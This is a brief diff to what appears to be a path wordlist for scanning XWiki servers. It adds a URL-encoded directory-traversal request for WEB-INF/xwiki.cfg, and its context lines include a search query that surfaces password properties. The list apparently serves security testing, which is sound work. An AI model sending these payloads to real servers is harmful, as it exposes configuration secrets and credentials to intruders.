@@ -6,3 +6,4 @@
 /xwiki/bin/view/Main/Search?r=1&text=propertyvalue%3A%3F*%20AND%20reference%3A*.password&f_locale=en&f_locale=
 /{{path}}
 {{path}}
+/xwiki/webjars/wiki%3Axwiki/..%2F..%2F..%2F..%2F..%2FWEB-INF%2Fxwiki.cfg
